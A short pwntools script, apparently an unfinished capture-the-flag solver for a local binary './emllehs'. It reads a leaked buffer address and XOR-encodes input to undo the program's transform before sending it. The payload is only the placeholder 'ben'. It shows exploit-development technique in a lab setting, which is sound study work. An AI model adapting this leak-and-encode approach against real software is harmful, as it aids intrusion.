from pwn import *

dd = 0x0f # 'c' * 'e' = 9999 = 0x270f

def filter(input_str):
    result = []
    for c in input_str:
        if ord(c) == dd ^ 10:
            transformed_val = ord(c)
        else:
            transformed_val = ord(c) ^ dd
        result.append(chr(transformed_val))
    return "".join(result)

p = process('./emllehs')

p.recvuntil(b'at: ')
leak = int(p.recvline().strip(),16)
log.info(f"Leaked buffer address: {hex(leak)}")

payload = "ben"
print(payload.encode('utf-8'))
# payload = payload.encode('utf-8')
# 4. XOR the payload (Program does: input ^ 0x0f)
# We pre-XOR so: (input ^ 0x0f) ^ 0x0f = original_input
encoded_payload = filter(payload)


print(encoded_payload)

# 5. Send it
p.sendline(encoded_payload)
p.interactive()